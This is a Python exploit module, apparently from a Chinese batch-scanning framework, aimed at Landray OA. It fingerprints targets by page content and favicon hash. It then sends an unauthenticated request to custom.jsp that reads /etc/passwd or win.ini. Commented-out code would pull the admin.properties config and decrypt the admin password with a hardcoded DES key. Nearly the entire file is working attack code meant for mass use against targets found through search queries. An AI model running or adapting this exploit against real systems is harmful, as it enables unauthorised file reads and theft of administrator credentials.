# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 18:24

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from exploit.scripts import BaseScript

import base64
import re
import pyDes

# app="Landray-OA系统"
# python batch.py -m exploit.scripts.OA.Landray.unauth_ssrf -cs -fs "app=\"Landray-OA系统\""


class Script(BaseScript):
    name = 'Landray'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = []
        # exec
        self.exec_path_list = ['/sys/ui/extend/varkind/custom.jsp']
        # 相关信息
        self.info = ''
        # favicon
        self.favicon_md5_list = ['302464c3f6207d57240649926cfc7bd4']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if text is not None and ('sys/ui/extend/theme/default/style/icon.css' in text and 'sys/ui/extend/theme/default/style/profile.css') in text:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                # data1 = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
                data_list = ['var={"body":{"file":"file:///etc/passwd"}}', 'var={"body":{"file":"file:///c://windows/win.ini"}}']
                for data in data_list:
                    async with session.post(url=url, data=data, headers=headers, timeout=self.req_timeout, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            await asyncio.sleep(2)
                            text = await response.text()
                            # if 'password' in text:
                            #     decode_password = ''
                            #     try:
                            #         encode_password = re.search(r'password = (.*)\\r', text).group(1)
                            #         cipher_des = pyDes.des('        ')  # 默认就需要8位，所以这里就先用空格来进行填充，后面再用解密密钥来进行填充
                            #         cipher_des.setKey('kmssAdmin')
                            #         decode_password = cipher_des.decrypt(base64.b64decode(encode_password)).decode('utf-8')
                            #     except Exception:
                            #         decode_password = 'get fail, please get it manually.'
                            if 'root:' in text or 'for 16-bit app support' in text:
                                gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                                return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass